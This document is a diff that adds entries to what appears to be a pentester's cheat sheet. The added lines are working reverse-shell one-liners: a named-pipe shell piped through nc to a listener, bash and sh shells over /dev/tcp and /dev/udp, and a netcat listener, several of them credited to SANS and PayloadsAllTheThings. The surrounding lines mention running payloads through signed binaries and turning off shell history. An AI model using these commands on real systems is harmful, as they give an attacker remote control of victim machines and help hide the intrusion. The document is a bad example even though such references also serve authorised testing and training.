@@ -61,6 +61,31 @@ Trusted signed binary will run the payload for you 😊
 
 
 *****************************
+
+reverse shell with named pipe (from sans.org)
+listen on pentestbox:443
+
+on victim:
+$ mknod /tmp/backpipe p 
+$ bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe
+
+###
+
+from github swisskyrepo/PayloadsAllTheThings - has something for almost every lang.
+
+# TCP
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
+
+# UDP
+Victim:
+sh -i >& /dev/udp/127.0.0.1/4242 0>&1
+
+Listener:
+nc -u -lvp 4242
+
+*****************************
 turn history on or off
 
 set +o history
